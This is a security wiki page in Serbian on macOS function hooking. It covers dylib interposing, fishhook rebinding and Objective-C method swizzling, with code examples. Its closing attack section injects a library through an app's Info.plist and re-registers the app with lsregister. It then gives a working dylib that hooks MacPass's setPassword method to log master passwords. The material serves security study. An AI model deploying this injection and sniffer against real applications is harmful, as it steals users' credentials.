# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Kreirajte **dylib** sa odeljkom **`__interpose` (`__DATA___interpose`)** (ili odeljkom označenim zastavicom **`S_INTERPOSING`**) koji sadrži torke **pokazivača na funkcije** koje upućuju na **originalne** i **zamenske** funkcije.

Zatim **ubacite** dylib pomoću **`DYLD_INSERT_LIBRARIES`** (interposing mora da se izvrši pre učitavanja glavne aplikacije). Očigledno je da se [**ograničenja** koja se primenjuju na upotrebu **`DYLD_INSERT_LIBRARIES``** primenjuju i ovde](macos-library-injection/index.html#check-restrictions).

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSING`** env varijabla može da se koristi za otklanjanje grešaka pri interposing-u i ispisivaće proces interposing-a.

Takođe imajte na umu da se **interposing odvija između procesa i učitanih biblioteka**; ne funkcioniše sa kešom deljenih biblioteka.

### Dynamic Interposing

Sada je takođe moguće dinamički izvršiti interposing funkcije pomoću funkcije **`dyld_dynamic_interpose`**. Ovo omogućava da se funkcija **programski** interpose-uje tokom **runtime-a**, umesto da se to radi samo na **početku**.

Potrebno je samo navesti **tuples** funkcije koju treba zameniti i **replacement** funkcije.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

Ako već imate izvršavanje koda **unutar procesa** i želite da zakačite **uveženu C funkciju** bez ponovnog pokretanja cilja, veoma čest primitiv je **ponovno povezivanje simbola** (popularizovao ga je **`fishhook`**).

Umesto korišćenja odeljka **`__interpose`**, ova tehnika prolazi kroz Mach-O metapodatke (`__LINKEDIT` -> tabela indirektnih simbola -> `__la_symbol_ptr` / `__nl_symbol_ptr`) i **prepisuje import slot** koji koristi trenutna slika. Ovo je veoma korisno za hookovanje funkcija u **već pokrenutom** procesu ili za hookovanje **samo jedne slike** pomoću `rebind_symbols_image`.<sup>[[2]](#references)</sup>

> [!TIP]
> Ovo utiče samo na pozive koji zaista prolaze kroz **import pointer**. Ako se ciljna funkcija poziva direktno unutar iste slike, ne postoji import slot koji bi mogao da se prepiše, pa ova tehnika neće detektovati to mesto poziva.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
Na novijim verzijama macOS-a mnoge mete za rebinding više se ne nalaze na upisivim stranicama **`__DATA`**. Rebinders obično moraju privremeno da učine **`__DATA_CONST`** upisivim pre patchovanja pointera. Osim toga, na Apple Silicon / **`arm64e`** treba očekivati autentifikovane pointere i dodatnu indirekciju u **`__AUTH_CONST.__auth_got`**, pa rebinder koji skenira samo klasične sekcije lazy/non-lazy symbol pointera može propustiti neka mesta poziva.<sup>[[3]](#references)</sup>

> [!CAUTION]
> ABI **`arm64e`** koristi **Pointer Authentication (PAC)** za mnoge function pointere. Slepo upisivanje pointera koje je ranije funkcionisalo na Intelu može pokvariti mesto poziva na Apple Silicon-u. Kada pišete sopstveni rebinder ili inline hooker, budite spremni da koristite pomoćne funkcije iz **`<ptrauth.h>`**, kao što su **`ptrauth_sign_unauthenticated`** ili **`ptrauth_auth_and_resign`**, i posebno testirajte na **`arm64e`** metama.

Za više detalja o **`__AUTH`**, **`__AUTH_CONST`** i **`__auth_got`**, pogledajte [ovu stranicu](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

U ObjectiveC-u se metoda poziva na sledeći način: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Potrebni su **objekat**, **metoda** i **parametri**. Kada se metoda pozove, šalje se **msg** pomoću funkcije **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Objekat je **`someObject`**, metoda je **`@selector(method1p1:p2:)`**, a argumenti su **value1**, **value2**.

Prateći strukture objekta, moguće je doći do **niza metoda** u kojem su **nazivi** i **pointeri** ka kodu metoda **smešteni**.<sup>[[1]](#references)</sup>

> [!CAUTION]
> Imajte na umu da se, pošto se metodama i klasama pristupa na osnovu njihovih naziva, ove informacije čuvaju u binarnom fajlu, pa ih je moguće preuzeti pomoću `otool -ov </path/bin>` ili [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Pristup raw metodama

Moguće je pristupiti informacijama o metodama, kao što su naziv, broj parametara ili adresa, kao u sledećem primeru:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

Funkcija **`method_exchangeImplementations`** omogućava **promenu** **adrese** **implementacije** **jedne funkcije u odnosu na drugu**.

> [!CAUTION]
> Dakle, kada se pozove funkcija, **izvršava se druga funkcija**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> U ovom slučaju, ako **implementation code legit** metode **proverava** **method** **name**, mogao bi da **detektuje** ovaj swizzling i spreči njegovo izvršavanje.
>
> Sledeća tehnika nema ovo ograničenje.

### Method Swizzling with method_setImplementation

Prethodni format je neobičan zato što menjate implementation 2 metode, jednu drugom. Korišćenjem funkcije **`method_setImplementation`** možete **promeniti** **implementation** jedne **method** u implementation druge.

Samo zapamtite da **sačuvate adresu implementation-a originalne metode** ako ćete je pozivati iz nove implementation pre nego što je prepišete, jer će kasnije biti mnogo komplikovanije pronaći tu adresu.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Metodologija Hooking napada

Na ovoj stranici razmatrani su različiti načini za hooking funkcija. Međutim, oni su podrazumevali **pokretanje koda unutar procesa koji se napada**.

Da biste to uradili, najlakša tehnika je ubrizgavanje [Dyld-a putem environment variables ili hijacking-a](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Međutim, pretpostavljam da bi se ovo moglo uraditi i putem [Dylib process injection-a](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

Međutim, obe opcije su **ograničene** na **nezaštićene** binarne datoteke/procese. Pogledajte svaku tehniku da biste saznali više o ograničenjima.

Međutim, napad pomoću hooking-a funkcije je veoma specifičan: napadač će to uraditi kako bi **ukrao osetljive informacije iz procesa** (u suprotnom biste jednostavno izvršili process injection napad). Ove osetljive informacije mogu se nalaziti u aplikacijama koje je korisnik preuzeo, kao što je MacPass.

Vektor napada bi zato bio da se pronađe ranjivost ili ukloni potpis aplikacije, a zatim da se kroz Info.plist aplikacije ubrizga environment variable **`DYLD_INSERT_LIBRARIES`**, dodavanjem nečega poput:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
a zatim **ponovo registrujte** aplikaciju:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Dodajte u tu biblioteku hooking code za exfiltrate informacija: lozinki, poruka...

> [!CAUTION]
> Imajte na umu da u novijim verzijama macOS-a, ako **uklonite potpis** binarne datoteke aplikacije, a ona je prethodno bila pokrenuta, macOS **više neće izvršavati aplikaciju**.

#### Primer biblioteke
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Reference

- [1] [Method Swizzling - NSHipster](https://nshipster.com/method-swizzling/)
- [2] [facebook/fishhook: Biblioteka koja pojednostavljuje proces dinamičkog ponovnog povezivanja simbola u Mach-O binarnim datotekama](https://github.com/facebook/fishhook)
- [3] [Autentifikacija pokazivača — Clang dokumentacija](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
